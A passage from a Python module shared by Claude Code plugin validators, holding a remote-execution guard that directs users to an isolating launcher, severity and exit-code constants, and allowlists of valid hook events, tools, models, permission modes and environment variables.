#!/usr/bin/env python3
"""
Claude Plugins Validation - Common Module

Shared validation infrastructure for all Claude Code plugin validators.
This module contains:
- Type definitions (Level, ValidationResult, ValidationReport)
- Common constants (tools, models, security patterns)
- Utility functions (scoring, formatting, exit codes)

All individual validators should import from this module to ensure consistency.
"""

from __future__ import annotations

import base64 as _rc68_base64
import binascii as _rc68_binascii
import fnmatch
import functools
import getpass
import json
import os
import re
import subprocess
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Literal

# =============================================================================
# Remote Execution Guard
# =============================================================================


def check_remote_execution_guard() -> None:
    """Abort if running from an unanchored remote location without the
    remote_validation.py launcher.

    Rationale
    ---------
    Validation scripts are designed to be invoked from either:

      (a) A development checkout of the CPV repo (cwd == scripts_dir_parent).
      (b) A PINNED, INSTALLED Claude Code plugin
          (`$CLAUDE_PLUGIN_ROOT/scripts/`) — the canonical path for slash-
          command and agent invocation.
      (c) The `remote_validation.py` launcher (which sets
          `CPV_REMOTE_VALIDATION=1` and handles environment isolation).

    Case (b) is the NORMAL path when a user runs `/cpv-validate-local-scope`
    or any CPV slash command — Claude Code sets `CLAUDE_PLUGIN_ROOT` to the
    installed plugin's directory and invokes the script from there. Treating
    this as "remote" was a v2.20.x false-positive that forced users into an
    undocumented env-var bypass.

    The guard fires ONLY when the scripts directory is in a bona-fide
    ephemeral location (uvx temp env, pipx venv) OR in a plugin cache that
    is NOT the one the current invocation advertises via `CLAUDE_PLUGIN_ROOT`.
    """
    if os.environ.get("CPV_REMOTE_VALIDATION") == "1":
        return  # Running via remote_validation.py — isolation is set up

    scripts_dir = os.path.dirname(os.path.abspath(__file__))

    # Case (b): slash-command / agent invocation — CLAUDE_PLUGIN_ROOT is set
    # by Claude Code and points to the installed plugin. If the running
    # scripts directory is inside that plugin root, trust it: the plugin is
    # pinned, version-locked, and already sandboxed by Claude Code's plugin
    # system. No isolation guard is required.
    claude_plugin_root = os.environ.get("CLAUDE_PLUGIN_ROOT")
    if claude_plugin_root:
        try:
            scripts_path = Path(scripts_dir).resolve()
            plugin_root_path = Path(claude_plugin_root).resolve()
            # str.startswith is fine here — both paths are resolved absolutes.
            if str(scripts_path).startswith(str(plugin_root_path) + os.sep) or str(scripts_path) == str(
                plugin_root_path
            ):
                return
        except (OSError, ValueError):
            pass

    cwd = os.getcwd()

    # Remaining remote-execution indicators — uvx/pipx temp envs only.
    # Plugin cache paths are INTENTIONALLY not listed here anymore: when the
    # plugin is invoked via its slash command, CLAUDE_PLUGIN_ROOT catches
    # the case above; when invoked via `uv run --from /path/to/cache/...`
    # without CLAUDE_PLUGIN_ROOT set, the cwd check below catches it.
    ephemeral_indicators = [
        "/uv/tools/",  # uvx temp environment
        "/pipx/venvs/",  # pipx environment
    ]

    is_remote = any(indicator in scripts_dir for indicator in ephemeral_indicators)

    # Also detect: scripts dir is not under or above the current working
    # directory. This catches stale plugin-cache invocations where
    # CLAUDE_PLUGIN_ROOT is not set (e.g. a user manually running the script
    # from an old cache copy via `python3 ~/.claude/plugins/cache/.../x.py`).
    if not is_remote:
        try:
            scripts_path = Path(scripts_dir).resolve()
            cwd_path = Path(cwd).resolve()
            is_remote = not (
                str(scripts_path).startswith(str(cwd_path)) or str(cwd_path).startswith(str(scripts_path.parent))
            )
        except (ValueError, OSError):
            pass

    if is_remote:
        script_name = os.path.basename(sys.argv[0])
        alias = script_name.replace(".py", "")
        # Strip optional `validate_` / `manage_` prefix to suggest the short
        # alias the launcher's --help advertises (e.g. `plugin` instead of
        # `validate_plugin`). Both forms resolve, but the short form is the
        # documented default.
        short_alias = alias
        for prefix in ("validate_", "manage_"):
            if alias.startswith(prefix):
                short_alias = alias[len(prefix) :]
                break
        # `validate_skill_comprehensive` → `skill` (special case — the file
        # name carries the historical `_comprehensive` suffix).
        if alias == "validate_skill_comprehensive":
            short_alias = "skill"
        print(
            f"ERROR: {script_name} is being run from a remote location without "
            f"the environment isolation launcher.\n\n"
            f"When running CPV scripts remotely (from uvx, pipx, or a plugin "
            f"cache WITHOUT the CLAUDE_PLUGIN_ROOT env var set), you MUST use "
            f"remote_validation.py to prevent the target's local config files "
            f"from interfering with validation.\n\n"
            f"If you are invoking via a Claude Code slash command, your plugin "
            f"is out of date — upgrade with `/plugin update "
            f"claude-plugins-validation@emasoft-plugins`.\n\n"
            f"Instead of:\n"
            f"  python3 {scripts_dir}/{script_name} /path/to/target\n\n"
            f"Use the canonical launcher invocation (with environment isolation):\n"
            f'  CLAUDE_PRIVATE_USERNAMES="$(whoami)" uv run --with pyyaml \\\n'
            f"    python {scripts_dir}/remote_validation.py {short_alias} /path/to/target\n\n"
            f"Or with the full alias (also works):\n"
            f"  python3 {scripts_dir}/remote_validation.py {alias} /path/to/target",
            file=sys.stderr,
        )
        sys.exit(1)


def launcher_epilog(short_alias: str) -> str:
    """Standard argparse epilog that points users at the canonical launcher.

    Every CPV validator/manager script should include this in its
    ArgumentParser:

        parser = argparse.ArgumentParser(
            ...,
            epilog=launcher_epilog("plugin"),
            formatter_class=argparse.RawDescriptionHelpFormatter,
        )

    The epilog tells users that the canonical way to run this script —
    especially when invoked from the plugin cache or via a Claude Code
    slash command — is through `remote_validation.py <alias>`. Direct
    invocation works only from a CPV development checkout.
    """
    return (
        "Canonical invocation (always via the launcher — environment isolation):\n"
        '  CLAUDE_PRIVATE_USERNAMES="$(whoami)" uv run --with pyyaml \\\n'
        f'    python "${{CLAUDE_PLUGIN_ROOT}}/scripts/remote_validation.py" {short_alias} <target>\n\n'
        "Direct invocation of this script is supported ONLY from a CPV development\n"
        "checkout. From the plugin cache (or any remote location without\n"
        "CLAUDE_PLUGIN_ROOT set), the environment-isolation guard refuses with a\n"
        "'remote location' error — use the launcher instead.\n\n"
        "Run `remote_validation.py --help` to see all available aliases."
    )


# =============================================================================
# Tool Resolution: local install → remote runner fallback (via smart_exec)
# =============================================================================


def resolve_tool_command(tool_name: str) -> list[str] | None:
    """Resolve a linting tool to its executable command prefix.

    Uses smart_exec's tool database and executor detection to find
    the best way to run the tool: local install first, then remote
    execution via uvx, bunx, npx, pnpm dlx, yarn dlx, deno, docker, etc.

    Supports 25+ tools across Python, Node, Deno, native, and PowerShell
    ecosystems. See smart_exec.py for the full TOOL_DB and PRIORITY tables.

    Returns:
        Command prefix as list (e.g. ["uvx", "ruff@latest"]) or None if
        no suitable executor is available on this system.
    """
    from smart_exec import choose_best, detect_executors, resolve_tool

    spec = resolve_tool(tool_name)
    executors = detect_executors()
    try:
        argv, _ = choose_best(spec, [], executors)
        return argv
    except RuntimeError:
        return None


# =============================================================================
# Type Definitions
# =============================================================================

# Validation result severity levels (uppercase for consistency)
# Hierarchy: CRITICAL > MAJOR > MINOR > NIT > WARNING > INFO > PASSED
# - CRITICAL/MAJOR/MINOR: always block validation (non-zero exit code)
# - NIT: blocks only in --strict mode
# - WARNING: never blocks, always reported (security advisories, best practices)
# - INFO: informational only, shown in verbose mode
# - PASSED: check passed, shown in verbose mode
Level = Literal["CRITICAL", "MAJOR", "MINOR", "NIT", "WARNING", "INFO", "PASSED"]

# =============================================================================
# Exit Codes
# =============================================================================

EXIT_OK = 0  # All checks passed (or only WARNING/INFO/PASSED)
EXIT_CRITICAL = 1  # CRITICAL issues found
EXIT_MAJOR = 2  # MAJOR issues found
EXIT_MINOR = 3  # MINOR issues found
EXIT_NIT = 4  # NIT issues found (only in --strict mode)

# =============================================================================
# Severity Level Constants (L1-L10 Alternative System)
# =============================================================================

# L1-L10 severity levels with confidence thresholds
# This alternative system maps numeric severity to confidence levels
SEVERITY_L1 = 1  # Low severity, confidence > 0.7
SEVERITY_L2 = 2  # Low severity, confidence > 0.7
SEVERITY_L3 = 3  # Low severity, confidence > 0.7
SEVERITY_L4 = 4  # Medium severity, confidence > 0.85
SEVERITY_L5 = 5  # Medium severity, confidence > 0.85
SEVERITY_L6 = 6  # Medium severity, confidence > 0.85
SEVERITY_L7 = 7  # High severity, confidence > 0.95
SEVERITY_L8 = 8  # High severity, confidence > 0.95
SEVERITY_L9 = 9  # High severity, confidence > 0.95
SEVERITY_L10 = 10  # Critical severity, confidence > 0.99


def severity_to_level(severity: int) -> Level:
    """Convert L1-L10 severity to standard Level.

    Args:
        severity: Numeric severity (1-10)

    Returns:
        Corresponding Level (CRITICAL, MAJOR, MINOR, NIT, WARNING, INFO)
    """
    if severity >= SEVERITY_L10:
        return "CRITICAL"
    elif severity >= SEVERITY_L7:
        return "MAJOR"
    elif severity >= SEVERITY_L4:
        return "MINOR"
    elif severity == SEVERITY_L3:
        return "NIT"
    elif severity == SEVERITY_L2:
        return "WARNING"
    else:
        return "INFO"


def level_to_severity(level: Level) -> int:
    """Convert standard Level to L1-L10 severity (midpoint of range).

    Args:
        level: Standard Level type

    Returns:
        Corresponding severity number (1-10)
    """
    mapping = {
        "CRITICAL": SEVERITY_L10,
        "MAJOR": SEVERITY_L8,
        "MINOR": SEVERITY_L5,
        "NIT": SEVERITY_L3,
        "WARNING": SEVERITY_L2,
        "INFO": SEVERITY_L1,
        "PASSED": SEVERITY_L1,
    }
    return mapping.get(level, SEVERITY_L1)


# =============================================================================
# Hook Event Types
# =============================================================================

# All valid hook event types in Claude Code (aligned with v2.1.121).
# Spec lists 28 events: 27 official + `Setup` retained internally for the
# command/mcp_tool-only gating, kept here as legacy WARNING-only.
VALID_HOOK_EVENTS = {
    "PreToolUse",
    "PostToolUse",
    "PostToolUseFailure",
    "PermissionRequest",
    "UserPromptSubmit",
    "UserPromptExpansion",  # v2.1.121 era — fires when slash/MCP-prompt expands
    "PostToolBatch",  # v2.1.121 era — after parallel tool batch resolves
    "Notification",
    "Stop",
    "SubagentStop",
    "SubagentStart",
    "SessionStart",
    "SessionEnd",
    "PreCompact",
    "PostCompact",  # v2.1.76 — fires after compaction completes
    "Setup",  # [legacy — emits WARNING] retained internally for gating only
    "TeammateIdle",
    "TaskCompleted",
    "ConfigChange",
    "WorktreeCreate",
    "WorktreeRemove",
    "InstructionsLoaded",
    "Elicitation",  # v2.1.76 — intercept MCP elicitation requests
    "ElicitationResult",  # v2.1.76 — intercept elicitation responses
    "StopFailure",  # v2.1.78 — fires when turn ends due to API error (rate limit, auth failure)
    "CwdChanged",  # v2.1.83 — fires when working directory changes (e.g. direnv)
    "FileChanged",  # v2.1.83 — fires when watched files change
    "TaskCreated",  # v2.1.84 — fires when a task is created via TaskCreate tool
    "PermissionDenied",  # v2.1.89 — fires when auto mode classifier denies a tool call
}

# =============================================================================
# Hook type allowlist + per-event compatibility matrix (v2.1.118+ added mcp_tool)
# =============================================================================
#
# 5 hook types defined by hooks.md:
#   command  — exec a process; stdout becomes hook output
#   http     — POST JSON to a URL
#   mcp_tool — invoke a tool on a connected MCP server (v2.1.118+)
#   prompt   — synthesize a prompt response without executing code
#   agent    — dispatch to a sub-agent
#
# Not every event accepts every type. SessionStart and Setup fire BEFORE
# MCP servers connect, so only `command` and `mcp_tool` are supported.
# Lifecycle/notification events do not support `prompt` or `agent`.

VALID_HOOK_TYPES: frozenset[str] = frozenset({"command", "http", "mcp_tool", "prompt", "agent"})

# Events that fire BEFORE MCP servers connect — only command + mcp_tool.
HOOK_EVENTS_COMMAND_ONLY: frozenset[str] = frozenset({"SessionStart", "Setup"})

# Events that DO NOT support `prompt` or `agent` types (per hooks.md grouping).
HOOK_EVENTS_NO_PROMPT_OR_AGENT: frozenset[str] = frozenset(
    {
        "ConfigChange",
        "CwdChanged",
        "Elicitation",
        "ElicitationResult",
        "FileChanged",
        "InstructionsLoaded",
        "Notification",
        "PermissionDenied",
        "PostCompact",
        "PreCompact",
        "SessionEnd",
        "StopFailure",
        "SubagentStart",
        "TeammateIdle",
        "WorktreeCreate",
        "WorktreeRemove",
    }
)


def hook_types_allowed_for_event(event: str) -> frozenset[str]:
    """Return the allowed hook types for the given event name.

    Per hooks.md (v2.1.121):
    - SessionStart / Setup: only `command` and `mcp_tool` (servers not yet connected).
    - Lifecycle events (CwdChanged, ConfigChange, etc.): no `prompt` / `agent`.
    - Tool events + UserPromptSubmit/Expansion + Stop family: full 5-type set.
    """
    if event in HOOK_EVENTS_COMMAND_ONLY:
        return frozenset({"command", "mcp_tool"})
    if event in HOOK_EVENTS_NO_PROMPT_OR_AGENT:
        return frozenset({"command", "http", "mcp_tool"})
    return VALID_HOOK_TYPES


# =============================================================================
# Common Constants
# =============================================================================

# Valid context values for agents and skills. Official spec only lists "fork".
VALID_CONTEXT_VALUES = {"fork"}

# Valid permission-mode values, used by agent frontmatter ``permissionMode``
# and by settings ``permissions.defaultMode`` (permission-modes.md L17-22).
# The same 6 values apply to both surfaces — single source of truth.
VALID_PERMISSION_MODES: frozenset[str] = frozenset(
    {
        "default",
        "acceptEdits",
        "plan",
        "auto",
        "dontAsk",
        "bypassPermissions",
    }
)

# Built-in agent types provided by Claude Code (sub-agents.md L29-74)
BUILTIN_AGENT_TYPES = {
    "Explore",
    "Plan",
    "general-purpose",
    "statusline-setup",
    "Claude Code Guide",
}

# Bundled slash commands shipped by Claude Code (v2.1.121).
# Plugin-shipped commands matching one of these names create a UI collision —
# the namespaced form `/<plugin>:<name>` is the documented workaround.
BUILTIN_SLASH_COMMANDS: frozenset[str] = frozenset(
    {
        # Core session / context
        "clear",
        "rename",
        "resume",
        "compact",
        "context",
        "rewind",
        "memory",
        "recap",
        # Auth + status
        "login",
        "logout",
        "config",
        "doctor",
        "model",
        "effort",
        "init",
        # Cost / usage
        "usage",
        "cost",
        "stats",
        "extra-usage",
        # UI / view
        "tui",
        "focus",
        "skills",
        "color",
        "theme",
        "less-permission-prompts",
        # Tool / MCP
        "mcp",
        "plugin",
        "context",
        "review",
        "security-review",
        # Loops + automation (v2.1.105 alias)
        "loop",
        "proactive",
        # Code-review + agent loops (v2.1.111+)
        "ultrareview",
        # Worktree + nav (v2.1.83+)
        "add-dir",
        "status",
        "permissions",
        "permission-mode",
        # Setup wizards
        "setup-vertex",
        "setup-bedrock",
        "setup-token",
        "terminal-setup",
        # Misc
        "release-notes",
        "feedback",
        "bug",
        "help",
        "exit",
        "quit",
    }
)

# Semantic version pattern for marketplace version fields
SEMVER_PATTERN = re.compile(r"^\d+\.\d+\.\d+(-[a-zA-Z0-9.]+)?(\+[a-zA-Z0-9.]+)?$")

# =============================================================================
# settings.json::extraKnownMarketplaces source types (v2.1.80+)
#
# NOTE: These are MARKETPLACE-level sources used inside
#     settings.json -> extraKnownMarketplaces -> <name> -> source
# They are DIFFERENT from the per-plugin sources allowed inside a
# marketplace.json file (see validate_marketplace.py::VALID_SOURCE_TYPES).
# The "settings" source is only valid here — it lets a user declare an
# inline marketplace with its plugin list embedded directly in settings.json.
# =============================================================================
VALID_SETTINGS_SOURCE_TYPES = {
    "github",
    "url",
    "git-subdir",  # CPV legacy alias — docs use {source: "git", path: ...} instead
    "npm",
    "settings",  # inline marketplace defined in same settings.json
    "git",  # generic git URL (less common than github)
    "directory",  # dev-only: local filesystem path
    "file",  # v2.1.98+ — absolute path to a marketplace.json file
    "hostPattern",  # v2.1.98+ — regex pattern matching marketplace host
    "pathPattern",  # v2.1.98+ — regex pattern matching filesystem path (self-hosted git)
}

# Required fields per settings-level source type.
# Each set is the minimum set of keys the source object MUST contain.
SETTINGS_SOURCE_REQUIRED_FIELDS: dict[str, set[str]] = {
    "github": {"repo"},
    "url": {"url"},
    "git-subdir": {"url", "path"},
    "npm": {"package"},
    "settings": {"name", "plugins"},
    "git": {"url"},
    "directory": {"path"},
    "file": {"path"},  # v2.1.98+
    "hostPattern": {"hostPattern"},  # v2.1.98+
    "pathPattern": {"pathPattern"},  # v2.1.98+
}

# =============================================================================
# strictKnownMarketplaces: an allowlist of marketplace identities used to
# LOCK DOWN which marketplaces a managed Claude Code install may load from.
# Per plugin-marketplaces.md:625-669 the allowed source-shape enumeration is
# INTENTIONALLY NARROWER than extraKnownMarketplaces:
#   - github:      {source: "github", repo: "owner/name"}
#   - url:         {source: "url", url: "https://..."}
#   - hostPattern: {source: "hostPattern", hostPattern: "<regex>"}
#   - pathPattern: {source: "pathPattern", pathPattern: "<regex>"}
# Using any other type (npm, git, git-subdir, settings, file, directory)
# here is accepted by CPV's broader VALID_SETTINGS_SOURCE_TYPES set but
# rejected at runtime by Claude Code — hence a MAJOR finding.
# =============================================================================
STRICT_KNOWN_MARKETPLACES_ALLOWED_SOURCE_TYPES: frozenset[str] = frozenset(
    {
        "github",
        "url",
        "hostPattern",
        "pathPattern",
    }
)

# Valid tool names for Claude Code agents
VALID_TOOLS = {
    "Read",
    "Write",
    "Edit",
    "Bash",
    "Grep",
    "Glob",
    "WebFetch",
    "WebSearch",
    "Task",  # Legacy alias for Agent — still accepted
    "NotebookEdit",
    "Skill",
    "AskUserQuestion",
    "EnterPlanMode",
    "ExitPlanMode",
    "EnterWorktree",
    "ExitWorktree",  # v2.1.72
    "TaskCreate",
    "TaskUpdate",
    "TaskList",
    "TaskGet",
    "TaskStop",
    "TaskOutput",  # v2.1.71 — deprecated (use Read on output file path instead)
    "ToolSearch",
    "MultiEdit",  # [legacy — emits WARNING] not in current tools-reference spec
    "Notebook",  # [legacy — emits WARNING] not in current tools-reference spec
    "TodoRead",  # [legacy — emits WARNING] not in current tools-reference spec
    "TodoWrite",
    "CronCreate",  # v2.1.71
    "CronDelete",  # v2.1.71
    "CronList",  # v2.1.71
    "LSP",
    "Agent",
    "Monitor",  # v2.1.98 — run command in background, feed each output line to Claude (same permissions as Bash)
    "PowerShell",  # v2.1.84 — Windows opt-in preview (CLAUDE_CODE_USE_POWERSHELL_TOOL=1)
    "ListMcpResourcesTool",  # Lists MCP server resources
    "ReadMcpResourceTool",  # Reads a specific MCP resource by URI
    "SendMessage",  # Agent teams — message teammates or resume subagents
    "TeamCreate",  # Agent teams — create a team
    "TeamDelete",  # Agent teams — disband a team
    # NOTE: `PushNotification` is not currently enumerated in tools-reference.md L13-49.
    # It was added to CPV under the rationale of v2.1.110 remote-control push support
    # but remains unverified against the official tools table. Kept here so authors
    # who use it do not trip a CPV MAJOR; revisit when tools-reference.md confirms.
    "PushNotification",
    "SlashCommand",  # v1.0.123 — enables Claude to invoke your slash commands
    "MCPSearch",  # v2.1.7 — MCP-specific tool search (distinct from generic ToolSearch)
}

# Valid model short names for agents (v2.1.74+: full model IDs also accepted)
VALID_MODELS = {"haiku", "sonnet", "opus", "inherit"}

# Valid effort levels for agents (v2.1.78+) and skills (v2.1.80+).
# - "low"/"medium"/"high": supported on all models per cli-reference.md --effort.
# - "xhigh": v2.1.111+ Opus 4.7 only (skills.md L192, sub-agents.md L244).
# - "max": Opus 4.6 legacy — still accepted, upgraded to Opus on request.
VALID_EFFORT_VALUES = {"low", "medium", "high", "xhigh", "max"}

# Regex for full model IDs like claude-opus-4-5, claude-sonnet-4-6, claude-haiku-4-5-20251001
# Full model IDs like claude-opus-4-6, claude-sonnet-4-6[1m], etc.
_FULL_MODEL_ID_RE = re.compile(r"^claude-(?:opus|sonnet|haiku)-\d[\w.-]*(?:\[1m\])?$")

# Short aliases with optional [1m] suffix: opus, sonnet[1m], haiku, etc.
_SHORT_MODEL_RE = re.compile(r"^(?:haiku|sonnet|opus|inherit|default|opusplan)(?:\[1m\])?$", re.IGNORECASE)


def is_valid_model(value: str) -> bool:
    """Check if a model value is valid (short name, alias, or full model ID).

    Valid formats:
    - Short aliases: haiku, sonnet, opus, inherit, default, opusplan
    - With 1M context: opus[1m], sonnet[1m], claude-opus-4-6[1m]
    - Full model IDs: claude-opus-4-6, claude-sonnet-4-5-20251001
    """
    return bool(_SHORT_MODEL_RE.match(value)) or bool(_FULL_MODEL_ID_RE.match(value))


# Environment variables provided by Claude Code at plugin load time.
# Plugins must use these instead of hardcoded absolute paths.
# Also includes Claude Code-configuration env vars that plugin authors may
# legitimately document or reference (OTEL_* for telemetry, CRON flags, etc.)
# — flagging them as unknown would produce false positives on legitimate plugin
# documentation. See env-vars.md + monitoring-usage.md + scheduled-tasks.md.
VALID_PLUGIN_ENV_VARS = {
    # Plugin-scoped (set by Claude Code per plugin/hook/skill)
    "CLAUDE_PLUGIN_ROOT",  # Plugin's root directory (all plugin hooks)
    "CLAUDE_PLUGIN_DATA",  # Persistent data directory that survives updates (v2.1.78)
    "CLAUDE_PROJECT_DIR",  # Project root directory (all hooks)
    "CLAUDE_ENV_FILE",  # SessionStart/CwdChanged/FileChanged — write export statements to persist env vars
    "CLAUDE_CODE_REMOTE",  # Set to "true" in remote web environments; not set in local CLI
    "CLAUDE_CODE_REMOTE_SESSION_ID",  # v2.1.x — cloud-session ID for transcript links (env-vars.md L123)
    "CLAUDE_CODE_MCP_SERVER_NAME",  # v2.1.85 — MCP server name, available in headersHelper scripts
    "CLAUDE_CODE_MCP_SERVER_URL",  # v2.1.85 — MCP server URL, available in headersHelper scripts
    "CLAUDE_CODE_TEAM_NAME",  # v2.1.x — agent team name for team members (env-vars.md L142)
    "CLAUDE_CODE_TASK_LIST_ID",  # v2.1.x — shared task list across sessions (env-vars.md L141)
    "CLAUDE_SKILL_DIR",  # Skill's own directory — for skills to reference their own files in SKILL.md
    "CLAUDE_SESSION_ID",  # Current session ID (skills.md — string substitution)
    "CLAUDECODE",  # Set to "1" in shells spawned by Claude Code (env-vars.md)
    # Telemetry / monitoring (monitoring-usage.md)
    "TRACEPARENT",  # W3C trace context propagated to Bash/PowerShell subprocesses when tracing active
    "TRACESTATE",  # v2.1.110 — companion trace-context header for SDK/headless distributed tracing
    "CLAUDE_CODE_ENABLE_TELEMETRY",  # Opt-in flag for OTEL export
    "CLAUDE_CODE_ENHANCED_TELEMETRY_BETA",  # Opt-in flag for enhanced OTEL (beta)
    "CLAUDE_CODE_OTEL_HEADERS_HELPER_DEBOUNCE_MS",  # Interval (default 1740000 = 29 min)
    "CLAUDE_CODE_MAX_RETRIES",  # Default 10 — referenced by telemetry retry-exhaustion detection
    # Scheduled tasks (scheduled-tasks.md)
    "CLAUDE_CODE_DISABLE_CRON",  # Disable the scheduler entirely
    # Feature flags (costs.md, features-overview.md)
    "CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS",  # User-level opt-in for agent teams (not plugin-shipped)
    "CLAUDE_CODE_USE_POWERSHELL_TOOL",  # Windows/macOS/Linux PowerShell opt-in (v2.1.84/v2.1.111)
    "MAX_THINKING_TOKENS",  # Extended-thinking token budget cap (default 8000)
    # Full OTEL env-var surface (monitoring-usage.md) — recognized to avoid
    # "unknown env var" false positives on legitimate enterprise telemetry setup.
    # Plugin-shipped settings SHOULD NOT include these (admin-managed), but
    # plugin READMEs and docs commonly reference them.
    "OTEL_METRICS_EXPORTER",
    "OTEL_LOGS_EXPORTER",
    "OTEL_TRACES_EXPORTER",
    "OTEL_EXPORTER_OTLP_PROTOCOL",
    "OTEL_EXPORTER_OTLP_ENDPOINT",
    "OTEL_EXPORTER_OTLP_HEADERS",
    "OTEL_EXPORTER_OTLP_METRICS_PROTOCOL",
    "OTEL_EXPORTER_OTLP_METRICS_ENDPOINT",
    "OTEL_EXPORTER_OTLP_LOGS_PROTOCOL",
    "OTEL_EXPORTER_OTLP_LOGS_ENDPOINT",
    "OTEL_EXPORTER_OTLP_TRACES_PROTOCOL",
    "OTEL_EXPORTER_OTLP_TRACES_ENDPOINT",
    "OTEL_EXPORTER_OTLP_METRICS_CLIENT_KEY",
    "OTEL_EXPORTER_OTLP_METRICS_CLIENT_CERTIFICATE",
    "OTEL_METRIC_EXPORT_INTERVAL",
    "OTEL_LOGS_EXPORT_INTERVAL",
    "OTEL_TRACES_EXPORT_INTERVAL",
    "OTEL_LOG_USER_PROMPTS",  # Privacy-sensitive — flagged as CRITICAL when plugin-shipped
    "OTEL_LOG_TOOL_DETAILS",
    "OTEL_LOG_TOOL_CONTENT",
    "OTEL_LOG_RAW_API_BODIES",  # Privacy-sensitive — flagged as CRITICAL when plugin-shipped
    "OTEL_METRICS_INCLUDE_SESSION_ID",
    "OTEL_METRICS_INCLUDE_VERSION",
    "OTEL_METRICS_INCLUDE_ACCOUNT_UUID",
    "OTEL_EXPORTER_OTLP_METRICS_TEMPORALITY_PREFERENCE",
    "OTEL_RESOURCE_ATTRIBUTES",
    # v2.22.2 batch: ANTHROPIC_* core API vars referenced pervasively in plugin
    # docs, env blocks, and settings.json env maps. False-positive source if absent.
    "ANTHROPIC_API_KEY",
    "ANTHROPIC_AUTH_TOKEN",
    "ANTHROPIC_BASE_URL",
    "ANTHROPIC_BEDROCK_BASE_URL",
    "ANTHROPIC_BEDROCK_SERVICE_TIER",  # v2.1.122 — Bedrock service tier (default/flex/priority)
    "ANTHROPIC_BETAS",  # v2.1.98 — beta opt-ins as env var
    "ANTHROPIC_CUSTOM_HEADERS",
    "ANTHROPIC_VERTEX_BASE_URL",
    "ANTHROPIC_VERTEX_PROJECT_ID",
    "ANTHROPIC_VERTEX_REGION",
    # Anthropic model-override env vars (v2.0.17 / v2.1.78 / v2.1.84)
    "ANTHROPIC_DEFAULT_OPUS_MODEL",
    "ANTHROPIC_DEFAULT_SONNET_MODEL",
    "ANTHROPIC_DEFAULT_HAIKU_MODEL",
    "ANTHROPIC_DEFAULT_OPUS_MODEL_NAME",
    "ANTHROPIC_DEFAULT_OPUS_MODEL_DESCRIPTION",
    "ANTHROPIC_DEFAULT_SONNET_MODEL_NAME",
    "ANTHROPIC_DEFAULT_SONNET_MODEL_DESCRIPTION",
    "ANTHROPIC_DEFAULT_HAIKU_MODEL_NAME",
    "ANTHROPIC_DEFAULT_HAIKU_MODEL_DESCRIPTION",
    "ANTHROPIC_DEFAULT_OPUS_MODEL_SUPPORTS",
    "ANTHROPIC_DEFAULT_SONNET_MODEL_SUPPORTS",
    "ANTHROPIC_DEFAULT_HAIKU_MODEL_SUPPORTS",
    "ANTHROPIC_CUSTOM_MODEL_OPTION",
    "ANTHROPIC_CUSTOM_MODEL_OPTION_NAME",
    "ANTHROPIC_CUSTOM_MODEL_OPTION_DESCRIPTION",
    # Plugin-lifecycle CLAUDE_CODE_PLUGIN_* env vars (v2.1.51 / v2.1.72 /
    # v2.1.78 / v2.1.90). Plugin authors legitimately reference these in docs,
    # CI, and setup scripts — false-positive source if absent.
    "CLAUDE_CODE_PLUGIN_SEED_DIR",
    "CLAUDE_CODE_PLUGIN_KEEP_MARKETPLACE_ON_FAILURE",
    "CLAUDE_CODE_PLUGIN_CACHE_DIR",
    "CLAUDE_CODE_PLUGIN_GIT_TIMEOUT_MS",
    # CLAUDE_CODE_* feature flags / toggles referenced in plugin docs + env blocks
    "CLAUDE_CODE_SIMPLE",  # v2.1.50 — set by --bare flag
    "CLAUDE_CODE_SUBPROCESS_ENV_SCRUB",  # v2.1.83 — security-critical
    "CLAUDE_CODE_DISABLE_BACKGROUND_TASKS",  # v2.1.4
    "CLAUDE_CODE_TMPDIR",  # v2.1.5
    "CLAUDE_CODE_DISABLE_GIT_INSTRUCTIONS",  # v2.1.69
    "CLAUDE_CODE_ADDITIONAL_DIRECTORIES_CLAUDE_MD",  # v2.1.20
    "CLAUDE_CODE_DISABLE_1M_CONTEXT",  # v2.1.50
    "CLAUDE_CODE_DISABLE_NONSTREAMING_FALLBACK",  # v2.1.82
    "CLAUDE_CODE_SESSIONEND_HOOKS_TIMEOUT_MS",  # v2.1.74
    "CLAUDE_CODE_PERFORCE_MODE",  # v2.1.98
    "CLAUDE_CODE_SCRIPT_CAPS",  # v2.1.98
    "CLAUDE_CODE_USE_MANTLE",  # v2.1.94 — Bedrock Mantle
    "CLAUDE_CODE_CERT_STORE",  # v2.1.101 — "bundled" to force bundled CAs
    "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC",  # v2.0.17
    "CLAUDE_CODE_DISABLE_TERMINAL_TITLE",  # v2.1.79
    "CLAUDE_CODE_EXIT_AFTER_STOP_DELAY",  # v2.0.35
    "CLAUDE_CODE_ENABLE_AWAY_SUMMARY",  # v2.1.108
    "CLAUDE_CODE_ENABLE_TASKS",  # v2.1.19
    "CLAUDE_CODE_MAX_CONTEXT_TOKENS",  # v2.1.98
    "CLAUDE_CODE_MAX_OUTPUT_TOKENS",  # v2.1.69
    "CLAUDE_CODE_FILE_READ_MAX_OUTPUT_TOKENS",  # v2.1.0
    "CLAUDE_CODE_ACCOUNT_UUID",  # v2.1.51 — internal, read-only
    "CLAUDE_CODE_USER_EMAIL",  # v2.1.51 — internal, read-only
    "CLAUDE_CODE_ORGANIZATION_UUID",  # v2.1.51 — internal, read-only
    "CLAUDE_CODE_SHELL",  # v2.0.65 — override shell used for Bash tool
    "CLAUDE_CODE_DEBUG_LOGS_DIR",  # cli-reference.md --debug-file
    "CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS",  # v2.1.25 / v2.1.81
    "CLAUDE_CODE_GIT_BASH_PATH",  # v2.1.98 — Windows git-bash path override
    "CLAUDE_CODE_PROXY_RESOLVES_HOSTS",  # v2.0.55
    "CLAUDE_CODE_SKIP_BEDROCK_AUTH",  # v2.1.96
    "CLAUDE_REMOTE_CONTROL_SESSION_NAME_PREFIX",  # v2.1.84
    "CLAUDE_STREAM_IDLE_TIMEOUT_MS",  # v2.1.84
    "CLAUDE_BASH_NO_LOGIN",  # v1.0.124 — preserved reference
    "CLAUDE_CONFIG_DIR",  # env-vars.md — override ~/.claude
    # MCP-specific env vars (plugin authors reference these in docs)
    "MCP_CONNECTION_NONBLOCKING",  # v2.1.89
    "ENABLE_CLAUDEAI_MCP_SERVERS",  # v2.1.63
    "ENABLE_TOOL_SEARCH",  # v2.1.72
    # AWS / Bedrock auth env vars
    "AWS_BEARER_TOKEN_BEDROCK",  # v2.1.94
    # Auto-updater + feature toggles referenced in plugin READMEs
    "DISABLE_AUTOUPDATER",  # discover-plugins.md
